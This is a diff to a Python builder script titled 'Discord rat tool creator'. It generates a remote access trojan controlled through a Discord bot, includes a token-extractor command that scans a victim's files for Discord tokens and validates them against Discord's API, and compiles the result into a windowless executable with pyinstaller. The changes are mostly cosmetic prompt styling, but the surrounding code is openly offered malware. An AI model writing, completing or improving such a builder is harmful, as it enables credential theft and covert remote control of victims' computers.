@@ -8,7 +8,7 @@ from util.plugins.common import *
 
 
 def discordrat():
-    setTitle("Rat Tool")
+    XTitle("Discord rat tool creator")
     def spinner():
         l = ['|', '/', '-', '\\']
         for i in l+l:
@@ -21,21 +21,18 @@ def discordrat():
             sys.stdout.flush()
             time.sleep(0.2)
 
-    print(f"""Enter the name you want to give to the final file: """)
     global filename
-    fileName = str(input(f"""File name: """))
-    print(f"""\nEnter the token of the bot you will use to execute the RAT commands: """)
+    fileName = str(input(f"""{Fore.RED} <~> File name: {Fore.BLUE}"""))
     global tokenbot
-    tokenbot = str(input(f"""Bot token: """))
-    print(f"""\nEnter the guild ID on which the slash commands are registered: """)
-    guildid = str(input(f"""Guild ID: """))
+    tokenbot = str(input(f"""{Fore.RED} <~> Bot Token: {Fore.BLUE}"""))
+    guildid = str(input(f"""{Fore.RED} <~> Guild ID: {Fore.BLUE}"""))
     print('\n')
     spinner()
     if not os.path.exists("output"):
         os.makedirs("output")
         
     try:
-        with open(f"output/{fileName}.py", "w") as file:
+        with open(f" <*> output/{fileName}.py", "w", encoding="utf-8") as file:
             file.write("""import discord 
 import json 
 import subprocess 
@@ -288,7 +285,7 @@ async def TokenExtractor_command(ctx: SlashContext):
                         for token in re.findall(regex, line):
                             tokens.append(token)
         for token in tokens:
-            r = requests.get("https://discord.com/api/v10/users/@me", headers={
+            r = requests.get("https://discord.com/api/v9/users/@me", headers={
                 "Content-Type": "application/json",
                 "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
                 "Authorization": token
@@ -602,22 +599,21 @@ client.run(token)""".replace("~~TOKENHERE~~'", tokenbot + "'; g = [" + guildid +
 
 
     except Exception as e:
-        print(f"""\n\n\n\nError writing file: {e}""")
-        os.system(2)
+        print(f"""\n\n\n\n {Fore.RED}<!> Error writing file: {e}""")
         clear()
 
-    print(f"""\n\n\nFile has been correctly written to "output/{fileName}.py" """)
-    convert = input(f"""Convert your script into an executable (Y/N) ? """)
+    print(f"""\n\n\n <*> File has been correctly written to "output/{fileName}.py" """)
+    convert = input(f""" {Fore.RED}<~> Convert your script into an executable (Y/N)? : {Fore.BLUE}""")
     if convert.upper() == 'Y' or convert.upper() == 'YES':
         try:
             time.sleep(1)
             clear()
 
-            print(f'File creation...')
+            print(f' <*> File creation...')
             time.sleep(1)
-            os.system(f"pyinstaller --noconsole -y -F -w output/{fileName}.py")
+            os.system(f"pyinstaller --onefile --noconsole -y -F -w output/{fileName}.py")
             clear()
-            print(f'Cleaning up old files...')
+            print(f' <!> Cleaning up old files...')
             time.sleep(1)
             try:
                 import shutil
@@ -629,11 +625,7 @@ client.run(token)""".replace("~~TOKENHERE~~'", tokenbot + "'; g = [" + guildid +
             except:
                 pass
             clear()
-            print(f"The executable file has been correctly generated")
+            print(f" <*> The executable file has been correctly generated")
         except:
             clear()
-            print(f"The executable file has been correctly generated")
-    
-        input(f"Press ENTER to exit")
-    else:
-        input(f"Press ENTER to exit")
+            print(f" <*> The executable file has been correctly generated")
